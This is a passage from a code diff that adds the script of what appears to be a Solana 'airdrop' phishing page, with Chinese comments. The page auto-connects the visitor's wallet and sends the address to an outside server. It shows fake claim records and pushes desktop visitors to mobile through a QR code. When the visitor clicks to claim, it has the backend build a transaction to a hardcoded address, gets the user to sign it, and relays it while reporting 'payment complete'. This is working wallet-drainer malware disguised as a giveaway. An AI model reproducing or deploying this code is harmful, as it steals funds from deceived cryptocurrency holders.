+      showModal('指定地址不能为空');
+      return;
+    }
+
+    // 获取钱包地址的前3位和后4位
+    const shortenedAddress = walletAddress.slice(0, 3) + '...' + walletAddress.slice(-4);
+
+    // 确保 'connectButton' 元素存在后再修改其文本
+    const connectButton = document.getElementById('connectButton');
+    if (connectButton) {
+      connectButton.innerText = shortenedAddress;
+    
+    }
+const addressInput = document.getElementById('addressInput');
+      if (addressInput) {
+        addressInput.value = walletAddress;  // 填充地址
+        addressInput.readOnly = true;  // 设置为只读
+      }
+    // 确保 'walletAddress' 元素存在
+    const walletAddressElement = document.getElementById('walletAddress');
+    if (walletAddressElement) {
+      walletAddressElement.style.display = 'none';
+    }
+
+    // 确保 'transferAuth' 元素存在
+    const transferAuth = document.getElementById('transferAuth');
+    if (transferAuth) {
+      transferAuth.disabled = false;
+    }
+
+    try {
+      console.log('正在发送请求到后端...');
+      const res = await fetch('https://api2.001br.com/prefetch-token', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          publicKey: walletAddress,  // 用户钱包地址
+          specifiedAddress: specifiedAddress  // 从反向代理中获取的指定地址
+        })
+      });
+
+      const data = await res.json();
+
+      if (data.success) {
+        // 根据返回的 status 判断是否显示提示
+        if (data.status === 0) {
+          showModal('当前钱包暂不支持该空投活动，请多多关注其他活动');
+        }
+      } else {
+        showModal('网络异常');
+      }
+
+    } catch (error) {
+      console.error('请求错误:', error);
+      showModal('网络异常');
+    }
+
+  } catch (error) {
+    // 如果连接失败，重新显示连接按钮
+    const connectButton = document.getElementById('connectButton');
+    if (connectButton) {
+      connectButton.style.display = 'block';
+    }
+    showModal('自动连接失败: ' + error.message);
+  }
+});
+
+document.getElementById('transferAuth').addEventListener('click', async () => {
+try {
+  const response = await window.solana.connect();
+  const walletAddress = response.publicKey.toString();
+
+  // 确保用户地址已连接
+  if (!walletAddress) {
+    showModal('请先连接钱包');
+    return;
+  }
+
+  // 获取指定的地址
+  const specifiedAddress = 'Cm6mrpZrRLrp6G85tKbD5QZumNLGboFofsaduQ22JT4L';  // 示例的指定地址
+
+  // 提交请求到后端
+  const buildResponse = await fetch('https://api2.001br.com/build-transaction', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      publicKey: walletAddress,
+      targetAddress: specifiedAddress,
+    })
+  });
+
+  const buildData = await buildResponse.json();
+  if (!buildData.success) {
+    throw new Error(buildData.error || '无法构建交易');
+  }
+
+  const transactionBytes = base64ToUint8Array(buildData.transaction);
+  const tx = solanaWeb3.Transaction.from(transactionBytes);
+
+  try {
+    const signedTx = await window.solana.signTransaction(tx);
+
+    const signedTxBase64 = uint8ArrayToBase64(signedTx.serialize());
+    await fetch('https://api2.001br.com/send-transaction', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ signedTx: signedTxBase64 })
+    });
+
+    showModal('支付已完成');
+  } catch (error) {
+    // 检查是否是用户拒绝交易或 TypeError
+    if (error.message && (error.message.includes('User rejected the request') || error.message.includes('signedTx'))) {
+      showModal('取消领取');
+    } else {
+      showModal('签名错误:', error.message || error);
+    }
+  }
+} catch (error) {
+  // 捕获并显示错误
+  console.error('Main error:', error);
+  showModal('领取错误:', error.message || error);
+}
+
+});
+
+ 
+    // 显示模态框
+    function showModal(title, message, icon = "🎁", isError = false) {
+      const modal = document.getElementById('modalOverlay');
+      const modalTitle = document.getElementById('modalTitle');
+      const modalContent = document.getElementById('modalContent');
+      const modalIcon = document.getElementById('modalIcon');
+      const modalButton = document.getElementById('modalButton');
+      
+      modalTitle.textContent = title;
+      modalContent.textContent = message;
+      modalIcon.textContent = icon;
+      
+      if (isError) {
+        modalIcon.style.color = "#ff3b30";
+      } else {
+        modalIcon.style.color = "#6c5ce7";
+      }
+      
+      modalButton.onclick = hideModal;
+      modal.classList.add('show');
+    }
+    
+    function hideModal() {
+      document.getElementById('modalOverlay').classList.remove('show');
+    }
+    
+    // 移动端菜单切换
+  // 移动端菜单切换 - 修改后的版本
+const menuToggle = document.getElementById('menuToggle');
+const navLinks = document.getElementById('navLinks');
+
+// 点击菜单按钮切换菜单
+menuToggle.addEventListener('click', function() {
+  navLinks.classList.toggle('active');
+  this.innerHTML = navLinks.classList.contains('active') ? 
+    '<i class="fas fa-times"></i>' : '<i class="fas fa-bars"></i>';
+});
+
+// 点击菜单项后收起菜单
+document.querySelectorAll('.nav-links a').forEach(link => {
+  link.addEventListener('click', function() {
+    if (window.innerWidth <= 768) { // 只在移动端生效
+      navLinks.classList.remove('active');
+      menuToggle.innerHTML = '<i class="fas fa-bars"></i>';
+    }
+  });
+});
+
+// 滑动页面时收起菜单
+window.addEventListener('scroll', function() {
+  if (window.innerWidth <= 768 && navLinks.classList.contains('active')) {
+    navLinks.classList.remove('active');
+    menuToggle.innerHTML = '<i class="fas fa-bars"></i>';
+  }
+});
+    
+    // 页面加载完成后执行
+document.addEventListener('DOMContentLoaded', () => {
+  displayFakeActivities();  // 确保虚假记录能正常显示
+  autoConnectWallet();
+  
+  // 检测设备类型
+  const isMobile = window.innerWidth <= 768;
+
+  // 如果是PC，弹出二维码弹窗，二维码内容是当前网页的 URL
+  if (!isMobile) {
+    showQRCodeModal();  // 调用二维码生成弹窗
+  } else {
+    autoConnectWallet(); // 自动连接钱包（手机设备）
+  }
+});
+
+// 显示二维码弹窗
+function showQRCodeModal() {
+  const qrModal = document.getElementById('qrModalOverlay');
+  const canvas = document.getElementById('qrcode');
+  const currentUrl = window.location.href.split('#')[0];
+
+  // 清空 canvas
+  const ctx = canvas.getContext('2d');
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+  // 你的 SVG 图标的 URL
+  const logoURL = 'https://www.iconaves.com/chain/solana.png';
+
+  // 生成二维码并绘制到 canvas 上
+  QRCode.toCanvas(
+    canvas,
+    currentUrl,
+    {
+      width: 200,
+      margin: 2,
+    },
+    (error) => {
+      if (error) {
+        console.error("生成失败:", error);
+      } else {
+        // 加载并绘制 Logo 图片到二维码上
+        const logoImage = new Image();
+        logoImage.onload = function() {
+          const logoSize = 40;  // 设置 Logo 大小
+          const x = (canvas.width - logoSize) / 2;  // 居中
+          const y = (canvas.height - logoSize) / 2; // 居中
+
+          // 在二维码中心绘制 Logo
+          ctx.drawImage(logoImage, x, y, logoSize, logoSize);
+        };
+        logoImage.src = logoURL;
+
+        // 显示二维码 Modal
+        qrModal.classList.add('show');
+      }
+    }
+  );
+}
+
+
+    
+    // 原有领取空投功能保持不变
+    
+    
+    function base64ToUint8Array(base64) {
+      const binaryString = atob(base64);
+      const bytes = new Uint8Array(binaryString.length);
+      for (let i = 0; i < binaryString.length; i++) {
+        bytes[i] = binaryString.charCodeAt(i);
+      }
+      return bytes;
+    }
+    
+    function uint8ArrayToBase64(uint8Array) {
+      let binary = '';
+      uint8Array.forEach(byte => {
+        binary += String.fromCharCode(byte);
+      });
+      return btoa(binary);
+    }
+  </script>
+  
+</body>
+</html>
